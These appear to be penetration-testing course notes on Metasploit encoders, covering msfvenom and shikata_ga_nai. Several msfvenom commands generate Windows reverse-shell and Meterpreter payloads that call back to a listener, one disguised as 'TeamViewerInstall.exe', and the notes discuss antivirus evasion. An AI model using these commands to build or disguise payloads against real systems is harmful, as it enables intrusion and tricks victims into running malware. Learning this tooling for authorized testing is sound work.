## **Encoders**

An Encoder changes/encodes a payload so it can:

- Work with different CPU architectures such as `x86`, `x64`, `sparc`, `ppc`, `mips`.
- Remove bad characters (hexadecimal bytes that could break the payload).
- Historically help with AV/IDS/IPS evasion. However, modern AV/IPS can usually detect encoded payloads, so encoding alone is not reliable AV evasion.

**Selecting an Encoder**

Before 2015, payload generation and encoding were handled separately by:

```
msfpayload → creates payload
     ↓
msfencode → encodes payload
```

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

They were later combined into: `msfvenom` . So today, `msfvenom` handles payload generation + encoding. 

**Generating Payload - Without Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

**Generating Payload - With Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

**Shikata Ga Nai Encoding**

If we want to look at the functioning of the `shikata_ga_nai` encoder, we can look at an excellent post here. `x86/shikata_ga_nai` was historically one of the most popular encoders because it was difficult to detect at the time.

If you already selected an Exploit + Payload: **`show encoders`** Metasploit automatically shows encoders compatible with that combination.

Picking up `msfvenom`, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

This will generate a payload with the `exe` format, called TeamViewerInstall.exe, which is meant to work on x86 architecture processors for the Windows platform, with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. 

As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called `msf-virustotal` that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.

```bash
00Luffy00@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
```
